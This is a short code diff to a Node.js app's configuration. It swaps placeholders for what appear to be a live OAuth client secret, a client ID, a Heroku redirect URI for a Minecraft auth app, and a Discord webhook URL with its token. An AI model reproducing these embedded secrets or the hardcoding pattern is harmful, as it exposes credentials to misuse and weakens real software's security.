@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'secret_value'
-const client_id = 'client_id'
-const redirect_uri = 'redirect_uri'
-const webhook_url = 'webhook'
+const client_secret = 'wbo8Q~zyiZUVZ5zVSbc7UZdjw334x9qNJ011IbDF'
+const client_id = '767bbf91-f318-4f75-ad82-526129dcd4f7'
+const redirect_uri = 'https://minecraft-auth-app.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1040858637360439326/vxSBR2vgbvztapoYlVm_wgc0k_I5RDI8q1r1RxtyI1koEGHSlGp15Ep2NolMeOc0zr3a'
 //Requirements
 const axios = require('axios')
 const express = require('express')
